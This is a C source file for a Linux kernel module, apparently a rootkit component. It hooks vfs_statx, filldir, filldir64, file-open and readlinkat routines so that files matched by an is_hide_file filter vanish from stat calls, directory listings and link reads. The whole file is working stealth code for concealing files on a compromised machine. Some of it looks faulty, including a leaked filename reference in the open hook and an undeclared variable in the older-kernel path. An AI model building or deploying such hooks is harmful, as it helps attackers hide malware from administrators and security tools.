#include "../prototypes.h"
#include "filters.h"


// ===================================================================================================

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 18, 0)
int (*real_vfs_statx)(int, struct filename *, int, struct kstat *, u32) = NULL;
int ex_vfs_statx(int dfd, struct filename *filename, int flags, struct kstat *stat, u32 request_mask)
#else
int (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32) = NULL;
int ex_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask)
#endif
{
    int ret = real_vfs_statx(dfd, filename, flags, stat, request_mask);

    if (ret < 0) {
        return ret;
    }

    const char *name;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 18, 0)
    name = filename->name;
#else
    struct path path;
    ret = user_path_at(dfd, filename, lookup_flags, &path);
    
    if (ret)
        return ret;

    name = path.dentry->d_name.name;
#endif

    if (is_hide_file(stat->uid.val, stat->gid.val, name)) {
        ret = -ENOENT;
    }

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
    path_put(&path); 
#endif

    return ret;
}

// ===================================================================================================

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
bool (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int) = NULL;
bool ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#else
int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int) = NULL;
int ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    if (is_hide_file(-1, -1, name)) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
		return true;
#else
		return 0;
#endif
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    bool ret;
#else
    int ret;
#endif
    ret = real_filldir(ctx, name, namlen, offset, ino, d_type);

    udelay(SLEEP_DELAY);
    return ret;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
bool (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int) = NULL;
bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#else
int (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int) = NULL;
int ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    if (is_hide_file(-1, -1, name)) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
		return true;
#else
		return 0;
#endif
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    bool ret;
#else
    int ret;
#endif
    ret = real_filldir64(ctx, name, namlen, offset, ino, d_type);
    udelay(SLEEP_DELAY);
    return ret;
}

// ===================================================================================================

struct filename *(*real_getname)(const char __user *) = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 15, 0)
int (*real_do_sys_openat2)(int, const char __user *, struct open_how *) = NULL;
int ex_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how)
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
long (*real_do_sys_openat2)(int, const char __user *, struct open_how *) = NULL;
long ex_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how)
#else
long (*real_do_sys_open)(int, const char __user *, int, umode_t) = NULL;
long ex_do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)
#endif
{
	struct filename *tmp;

	tmp = real_getname(filename);
	if (IS_ERR(tmp))
		return PTR_ERR(tmp);

    if (is_hide_file(-1, -1, tmp->name)) {
        // тут надо переименовывать файл или директорию. все зависит от флагов. так что надо судить по ним
        // если на создание, то надо переименовывать
        // иначе ошибка
        // pr_info("hola\n");
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 15, 0)
    int ret;
#else
    long ret;
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 15, 0)
    ret = real_do_sys_openat2(dfd, filename, how);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
    ret = real_do_sys_openat2(dfd, filename, how);
#else
    ret = real_do_sys_open(dfd, filename, flags, mode);
#endif

    udelay(SLEEP_DELAY);
    return ret;
}

// ===================================================================================================

int (*real_do_readlinkat)(int, const char __user *, char __user *, int) = NULL;
int ex_do_readlinkat(int dfd, const char __user *pathname, char __user *buf, int bufsiz)
{
    struct filename *tmp;

	tmp = real_getname(pathname);
	if (IS_ERR(tmp))
		return PTR_ERR(tmp);

    if (is_hide_file(-1, -1, tmp->name)) {
        putname(tmp);
        return -ENOENT;
    }

    putname(tmp);
    int ret = real_do_readlinkat(dfd, pathname, buf, bufsiz);

    udelay(SLEEP_DELAY);
    return ret;
}

// ===================================================================================================
// ...


